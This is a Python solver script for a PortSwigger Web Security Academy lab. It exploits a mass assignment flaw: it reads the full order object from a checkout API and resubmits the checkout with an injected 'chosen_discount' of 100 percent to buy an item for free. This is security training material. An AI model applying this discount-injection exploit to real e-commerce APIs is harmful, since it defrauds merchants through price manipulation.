# Lab 03 — Exploiting a mass assignment vulnerability
# PortSwigger: https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability
#
# Vulnerability: The checkout API's GET response reveals a chosen_discount
#                field the front-end never includes in its own POST body —
#                but the backend will still apply it if the client adds it
# Aim:           Buy the "Lightweight l33t Leather Jacket" via a 100% discount
#                you invent yourself
#
# Technique:
#   GET /api/checkout  reveals the FULL order object structure, including
#   chosen_discount. The UI's own POST never sends this field — but nothing
#   stops US from adding it back in with whatever value we like.
#
# Usage: python api_testing_lab03.py <url>

import sys
import json
import urllib3
from proxies import proxies
from api_testing_utils import banner, section, make_session, login, check_status, pretty_json, find_product_id, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 03 — EXPLOITING A MASS ASSIGNMENT VULNERABILITY")

    if len(sys.argv) != 2:
        print("  Usage: python api_testing_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: find the product and add it to the basket ───────────────────
    print("\n  ── Step 1: locate the leather jacket and add it to the basket\n")
    product_id = find_product_id(session, url)
    r_cart = session.post(f"{url}/cart", data={"productId": product_id, "quantity": "1"})
    check_status(r_cart, [200, 302], "Add to cart")

    # ── Step 2: attempt checkout — expect insufficient funds ─────────────────
    print("\n  ── Step 2: attempt checkout normally — expect it to fail\n")
    normal_body = {"chosen_products": [{"product_id": product_id, "quantity": 1}]}
    r_fail = session.post(f"{url}/api/checkout", json=normal_body)
    print(f"  ℹ  Status: {r_fail.status_code}")
    print_box("Checkout attempt (should fail)", r_fail.text)

    # ── Step 3: GET /api/checkout — reveal the full order structure ─────────
    print("  ── Step 3: GET /api/checkout to reveal the full order object\n")
    r_get = session.get(f"{url}/api/checkout")
    check_status(r_get, 200, "GET /api/checkout")
    print_box("Full order structure (note chosen_discount)", pretty_json(r_get))

    try:
        order_data = json.loads(r_get.text)
    except json.JSONDecodeError:
        print("  ✘  Could not parse JSON from GET /api/checkout — inspect manually")
        sys.exit(1)

    # ── Step 4: inject chosen_discount into the POST body ────────────────────
    print("  ── Step 4: re-submit checkout with chosen_discount.percentage = 100\n")

    exploit_body = {
        "chosen_discount": {"percentage": 100},
        "chosen_products": order_data.get("chosen_products", [
            {"product_id": product_id, "quantity": 1}
        ]),
    }
    print_box("Exploit POST body", json.dumps(exploit_body, indent=2))

    r_exploit = session.post(f"{url}/api/checkout", json=exploit_body)
    check_status(r_exploit, 200, "Checkout with injected 100% discount")
    print_box("Final response", r_exploit.text)

    print()
    print("  ℹ  chosen_discount was never sent by the UI's own POST request,")
    print("     but the GET response proved the server's data model includes it.")
    print("     The backend bound it onto the order object exactly like any")
    print("     other field — that's mass assignment.")
